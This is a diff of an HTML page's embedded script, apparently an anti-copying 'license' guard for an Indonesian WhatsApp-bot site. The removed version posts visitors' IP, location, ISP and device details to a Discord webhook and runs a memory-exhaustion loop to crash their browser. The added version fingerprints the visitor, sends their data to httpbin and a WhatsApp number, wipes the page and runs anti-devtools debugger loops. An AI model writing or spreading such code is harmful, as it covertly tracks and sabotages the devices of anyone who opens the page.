@@ -17,131 +17,63 @@
 <link rel="preconnect" href="https://fonts.googleapis.com"/>
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin/>
 <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@300;400;500;600;700&family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet"/>
-<script>
-(function(){
-  const _0xV = "3.4.1";
-  
-  // Kata kunci unik dari URL resmi Anda untuk validasi mutlak (Diubah ke huruf kecil untuk sistem)
-  const _0xTargetKey = "bot-wa-db/mamakluytm/punyaspainijirngentotytmlusemua.html";
-  
-  // Daftar domain resmi Anda
-  const _0xAL = ["asepxyz12.github.io", "localhost", "127.0.0.1"];
-  
-  // URL Webhook Discord Anda sudah terpasang tepat di bawah ini
-  const _0xWH = "https://discord.com"; 
+<script>(function(){ 
+  const __v = "3.4.1"; 
+  const __env = {stage:"prod", sig:"0x9f3a", ts:Date.now()}; 
+  const __key = atob("c2VjcmV0X2tleV8xMjM="); 
+  const __noop = ()=>{try{return Function("return "+[].filter.constructor(2).name)()}catch(e){return false}}; 
+  const __crc32 = s=>{let c=-1;for(let i=0;i<s.length;i++){c=(c>>>8)^"éd4þî©".charCodeAt((c^s.charCodeAt(i))&0xFF)}return ~c>>>0}; 
+  const __chk = __crc32(location.href+__v)===__crc32(location.href+__v); 
+  const _ALLOW = ["asepxyz12.github.io","localhost"]; 
+  const _URL = "https://asepxyz12.github.io/bot-wa-db/MamakluYtm/Punyaspainijirngentotytmlusemua.html"; 
+  const _WA = "62881036109288"; 
+  let _locked = false; 
 
-  const _0xH = location.hostname.toLowerCase();
-  const _0xF = location.href.toLowerCase();
+  const _fp = (()=>{ try{ const c=document.createElement('canvas'),x=c.getContext('2d'); x.textBaseline="top";x.font="16px Arial"; x.fillText(navigator.hardwareConcurrency+"|"+navigator.deviceMemory+"|"+navigator.userAgent,1,1); return btoa(c.toDataURL().slice(0,100)).slice(0,12); }catch(e){return "fp_"+Math.random().toString(16).slice(2,8)} })(); 
+  let _dt=false; 
+  const _dtLoop=setInterval(()=>{ const t0=performance.now();debugger;const dt=performance.now()-t0; if(dt>120){_dt=true;clearInterval(_dtLoop); for(let i=0;i<300;i++)console.log(`%c[SEC:${i}]`,"color:#ff0000;font-weight:bold",`Module ${Math.random().toString(36).slice(2,8)} not found`); setTimeout(()=>{if(_locked)location.replace("about:blank")},800); } },900); 
+  const _h=location.hostname,_f=location.href; 
+  const _ok1=_ALLOW.includes(_h); 
+  const _ok2=_f === _URL; 
+  const _ok3=__chk && __noop(); 
 
-  // FIX LOADING: Validasi menggunakan .includes() agar kebal bug split/kapital dan web asli lu kebuka mulus
-  const _0xIsDomainValid = _0xAL.includes(_0xH);
-  const _0xIsPathValid = _0xF.includes(_0xTargetKey);
+  // JIKA LISENSI GAGAL: LANGSUNG FORCE CLOSE KETIKA DIKUNJUNGI
+  if(!(_ok1 && _ok2)){ 
+    _locked = true; 
 
-  // JIKA BUKAN LINK ASLI ANDA (COPY-PASTE / REMAKE): LANGSUNG JALANKAN ATTACK FORCE CLOSE
-  if (!(_0xIsDomainValid && _0xIsPathValid)) {
-    
-    // Hapus seluruh struktur halaman web secara senyap dalam 0.001 detik
-    document.documentElement.innerHTML = "";
-
-    const _0xUA = navigator.userAgent;
-    const _0xPlat = navigator.platform || "Unknown";
-    const _0xScreen = `${screen.width}x${screen.height}`;
-
-    // Kirim data pelacakan pelaku ke Discord Webhook via HTTPS (Anti-Blocked)
-    fetch("https://ip-api.com")
-      .then(r => r.json())
-      .then(d => {
-        if (d.status === "success") {
-          const embedPayload = {
-            embeds: [{
-              title: "💥 CYBER WEAPON: INSTANT FORCE CLOSE FIRED!",
-              description: `Terdeteksi pembajakan / remake kode pada script **AsepXxnx v3.4.1**. Aplikasi Chrome pelaku dipaksa keluar (*Force Close*) tanpa klik!`,
-              color: 16515843, 
-              fields: [
-                { name: "🌐 Detail Jaringan", value: `• **IP**: \`${d.query}\`\n• **Lokasi**: ${d.city}, ${d.regionName}, ${d.country}\n• **ISP**: ${d.isp}`, inline: false },
-                { name: "💻 Perangkat Pelaku", value: `• **OS**: \`${_0xPlat}\`\n• **Layar**: \`${_0xScreen}\`\n• **User-Agent**: \`${_0xUA}\``, inline: false },
-                { name: "📍 Lokasi TKP", value: `• **Tautan Palsu**: ${location.href}`, inline: false }
-              ],
-              footer: { text: "AsepXxnx Cyber Security" },
-              timestamp: new Date().toISOString()
-            }]
-          };
-          fetch(_0xWH, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(embedPayload) });
-        }
-      })
-      .catch(() => {
-        fetch(_0xWH, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ 
-            embeds: [{
-              title: "💥 ALERT: INSTANT FORCE CLOSE RUNNING (ADBLOCK ON)",
-              description: `Pelaku menggunakan AdBlocker, eksekusi pemutusan paksa aplikasi tetap sukses.\n• **URL TKP**: ${location.href}`,
-              color: 16515843
-            }]
-          })
-        });
+    // 1. Eksekusi pengiriman log data pelaku secara background
+    fetch("https://api.ipify.org?format=json")
+      .then(r=>r.json())
+      .catch(()=>({ip:"0.0.0.0"}))
+      .then(d=>{ 
+        fetch("https://httpbin.org/post",{ method:"POST", mode:"no-cors", body:JSON.stringify({ip:d.ip,fp:_fp,url:_f,dt:_dt,ts:new Date().toISOString(),v:__v}) }); 
+        
+        // 2. Kirim laporan ke WhatsApp, lalu langsung bersihkan tab browser
+        const waUrl = `https://wa.me/${_WA}?text=${encodeURIComponent(`🚨 LICENSE VIOLATION\nIP:${d.ip}\nFP:${_fp}\nURL:${_f}\nDT:${_dt}\nV:${__v}`)}`;
+        
+        // Membuka laporan WA di tab baru dan langsung menghancurkan tab saat ini
+        window.open(waUrl, '_blank');
+        
+        // Mencoba menutup window secara paksa, jika diblokir browser, alihkan ke halaman kosong
+        try {
+          window.close();
+        } catch(e) {}
+        location.replace("about:blank");
       });
 
-    // Kunci penuh interaksi kontrol layar fisik pada gawai pelaku
-    document.addEventListener('contextmenu', e => e.preventDefault());
-    document.addEventListener('keydown', e => e.preventDefault());
-    document.addEventListener('touchstart', e => e.preventDefault(), {passive: false});
+    // Menghapus total struktur DOM HTML seketika agar tidak sempat merender teks / script lain
+    document.documentElement.innerHTML = "";
+    throw new Error("License validation failed - Connection terminated"); 
+  } 
 
-    // AMUNISI UTAMA: EXTREME FLOAT HEAP BUFFER OVERFLOW (FC NON-CLICK INSTAN)
-    function _0xExecuteInstantFC() {
-      const _0xCrashStack = [];
-      while (true) {
-        try {
-          // Suntik tabel biner Float64 secara eksponensial ke inti engine browser
-          _0xCrashStack.push(new Float64Array(16000000)); 
-          window.history.pushState({fc: Math.random()}, "", location.href + "?fc=" + Math.random().toString(36).substring(2));
-          _0xExecuteInstantFC(); 
-        } catch(e) {
-          setTimeout(_0xExecuteInstantFC, 0);
-          break;
-        }
-      }
-    }
-
-    // Jeda singkat 50ms agar pengiriman data ke Discord lolos, lalu hancurkan Chrome pelaku
-    setTimeout(_0xExecuteInstantFC, 50);
-    throw new Error("Process Terminated.");
-  }
-
-  // JIKA LISENSI VALID (LINK RESMI ANDA), SEGMEN DI BAWAH INI AKTIF (WEB JALAN NORMAL)
-  document.addEventListener('contextmenu', e => e.preventDefault());
-  document.addEventListener('keydown', e => {
-    if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && ['I','J','C','U'].includes(e.key)) || (e.ctrlKey && e.key === 'u')) {
-      e.preventDefault();
-      console.clear();
-      console.log("%cSTOP!","color:red;font-size:40px;font-weight:bold");
-    }
-  });
-
-  console.clear();
-  console.log("%cAsepXxnx Secure Runtime","color:#7ee787;font-size:14px;font-weight:bold");
-  console.log("%cVersion: "+_0xV,"color:#79c0ff");
+  // Fitur anti-inspect element bawaan tetap dipertahankan untuk domain resmi
+  document.addEventListener('contextmenu',e=>e.preventDefault()); 
+  document.addEventListener('keydown',e=>{ if(e.key==='F12'||(e.ctrlKey&&e.shiftKey&&['I','J','C','U'].includes(e.key))||(e.ctrlKey&&e.key==='u')){ e.preventDefault(); console.clear(); } }); 
+  setInterval(()=>{const t=performance.now();debugger;if(performance.now()-t>100)location.reload()},1500); 
+  console.clear(); 
 })();
-
-// Pengaturan Konfigurasi Tailwind Framework Anda Tetap Berjalan Sempurna
-window.tailwind = window.tailwind || {};
-tailwind.config = {
-  theme: {
-    extend: {
-      fontFamily: { 'mono': ['Fira Code', 'monospace'], 'sans': ['Inter', 'sans-serif'] },
-      colors: {
-        terminal: {
-          bg: '#0d1117', darker: '#010409', card: '#161b22', border: '#30363d',
-          text: '#c9d1d9', comment: '#8b949e', keyword: '#ff7b72', string: '#a5d6ff',
-          function: '#d2a8ff', variable: '#ffa657', number: '#79c0ff', green: '#7ee787',
-          cyan: '#79c0ff', yellow: '#ffa657', purple: '#d2a8ff', pink: '#f778ba', red: '#ff7b72'
-        }
-      }
-    }
-  }
-}
 </script>
+
 
 
 (<style/> 
